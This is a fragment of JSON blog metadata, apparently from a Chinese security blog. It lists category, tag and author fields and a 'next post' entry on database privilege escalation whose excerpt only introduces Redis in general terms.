mins."},"categories":[{"name":"权限提升","slug":"权限提升","count":10,"path":"api/categories/权限提升.json"}],"tags":[{"name":"权限提升","slug":"权限提升","count":10,"path":"api/tags/权限提升.json"}],"author":{"name":"Aurora","slug":"blog-author","avatar":"https://img-blog.csdnimg.cn/20210313122054101.png","link":"/","description":"","socials":{"github":"","twitter":"","stackoverflow":"","wechat":"","qq":"","weibo":"","zhihu":"","csdn":"","juejin":"","customs":{}}}},"next_post":{"title":"权限提升-数据库提权2","uid":"2b9713aac0d7c052ca172c6738a7a353","slug":"权限提升-数据库提权2","date":"2022-06-21T00:31:26.000Z","updated":"2022-06-21T15:02:52.187Z","comments":true,"path":"api/articles/权限提升-数据库提权2.json","keywords":null,"cover":[],"text":"0x00脑图： 0x01 Redis数据库提权0x00 redis介绍Redis是一个开源的使用ANSI C语言编写、支持网络、可基于内存亦可持久化的日志型、Key-Value数据库，并提供多种语言的API。从2010年3月15日起，Redis的开发工作由VMware主持。从20...","link":"","photos":[],"count_time":{"symbolsCount":"4.1k","symbolsTime":"4 mins."},"categories":[{"name":"权限提升","slug":"权限提升","count":10,"path":"api/categories/权限提升.json"}],"tags":[{"name":"权限提升","slug":"权限提升","count":10,"path":"api/tags/权限提升.json"}],"author":{"name":"Aurora","slug":"blog-author","avatar":"https://img-blog.csdnimg.cn/20210313122054101.png","link":"/","description":"","socials":{"github":"","twitter":"","stackoverflow":"","wechat":"","qq":"","weibo":"","zhihu":"","csdn":"","juejin":"","customs":{}}}}}